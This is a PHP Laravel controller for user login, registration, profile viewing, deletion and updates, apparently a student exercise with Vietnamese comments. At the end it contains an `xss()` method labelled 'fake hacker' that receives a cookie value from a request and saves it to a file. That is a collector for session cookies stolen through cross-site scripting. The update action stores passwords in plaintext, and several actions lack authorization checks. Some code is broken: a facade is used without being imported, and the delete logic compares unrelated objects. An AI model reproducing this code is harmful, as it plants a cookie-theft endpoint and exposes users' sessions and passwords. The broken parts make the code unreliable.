<?php

namespace App\Http\Controllers;

use Hash;
use Session;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use App\Models\Favorities;
use App\Models\Posts;
use App\Models\Profile;
/**
 * CRUD User controller
 */
class CrudUserController extends Controller
{

    /**
     * Login page
     */
    public function login()
    {
        return view('crud_user.login');
    }

    /**
     * User submit form login
     */
    public function authUser(Request $request)
    {
        $request->validate([
            'email' => 'required',
            'password' => 'required',
            
        ]);

        $credentials = $request->only('email', 'password');

        if (Auth::attempt($credentials)) {
            return redirect()->intended('list')
                ->withSuccess('Signed in');
        }

        return redirect("login")->withSuccess('Login details are not valid');
    }

    /**
     * Registration page
     */
    public function createUser()
    {
        return view('crud_user.create');
    }

    /**
     * User submit form register
     */
    public function postUser(Request $request)
    {
        $request->validate([
            'name' => 'required',
            'email' => 'required|email|unique:users',
            'mssv' => 'required',
            'password' => 'required|min:6',
        ]);

        $data = $request->all();
        $check = User::create([
            'name' => $data['name'],
            'mssv' => $data['mssv'],
            'email' => $data['email'],
            'password' => Hash::make($data['password'])
        ]);

        return redirect("login");
    }

    /**
     * View user detail page
     */
   public function readUser(Request $request)
    {
        $user_id = $request->get('id');
        $user = User::find($user_id);
        if (!$user) {
            return redirect("list")->withError('Người dùng không tồn tại');
        }
        // truy vấn tìm bài viết của người dùng
        $user_profile = Profile::where('user_id', $user_id)->first();
        if (!$user_profile) {
            return redirect("list")->withError('người dùng không có bài viết');
        }
        //tim xem nguoi dung có sở thích không
        $sothich = DB::table('user_favorite')->where('user_id', $user_id)->first();
        if (!$sothich) {
            return redirect("list")->withError('người dùng khong có sở thích');
        }
        
        // lấy id sở thích
        $favorite_id = $sothich->favorite_id;
        
        //truy vấn dựa vài id sở thích tìm sở thích người dùng
        $tenst = Favorities::where('favorite_id', $favorite_id)->get();

        //truy vấn tìm bà viết của người dùng
        $user_posts = Posts::where('user_id', $user_id)->get();

        return view('crud_user.readF', ['messi' => $user_profile, 'posts' => $user_posts, 'st' => $tenst]);
    }
    /**
     * Delete user by id
     */
    public function deleteUser(Request $request) {
        $user_id = $request->get('id');
        $posts = Posts::where('user_id', $user_id)->count();
        if ($posts > 0) {
            return redirect("list")->withError('Người dùng đã có bài đăng, không thể xóa');
        }

        $nguoidung = User::find($user_id);
        $sothich = Favorities::find($nguoidung);
        if ($sothich == $nguoidung) {
            return redirect("list")->withError('Người dùng có sở thích, không thể xóa');
        }
        $user = User::destroy($user_id);
        return redirect("list")->withSuccess('xóa thành công');
    }

    /**
     * Form update user page
     */
    public function updateUser(Request $request)
    {
        $user_id = $request->get('id');
        $user = User::find($user_id);

        return view('crud_user.update', ['user' => $user]);
    }

    /**
     * Submit form update user
     */
    public function postUpdateUser(Request $request)
    {
        $input = $request->all();

        $request->validate([
            'name' => 'required',
            'mssv' =>'required',
            'email' => 'required|email|unique:users,id,'.$input['id'],
            'password' => 'required|min:6',
        ]);

       $user = User::find($input['id']);
       $user->name = $input['name'];
       $user->mssv = $input['mssv'];
       $user->email = $input['email'];
       $user->password = $input['password'];
       $user->save();

        return redirect("list")->withSuccess('You have signed-in');
    }

    /**
     * List of users
     */
    public function listUser()
    {
        if(Auth::check()){
            $users = User::paginate(2);
            //$users = User::all();
            return view('crud_user.listdanhsach', ['users' => $users]);
        }

        return redirect("login")->withSuccess('You are not allowed to access');
    }
    
    // public function listDanhSach()
    // {
    //     if(Auth::check()){
    //         //$users = User::paginate(2);
    //         //$users = User::all();
    //         return view('crud_user.listdanhsach', ['users' => $users]);
    //     }

    //     return redirect("login")->withSuccess('You are not allowed to access');
    // }

    /**
     * Sign out
     */
    public function signOut() {
        Session::flush();
        Auth::logout();

        return Redirect('login');
    }
    
    //gia hacker
    public function xss(Request $request){
        $cookie =$request ->get('cookie');
        file_put_contents('xss.txt',$cookie);
        var_dump($cookie);die();
        
    }
}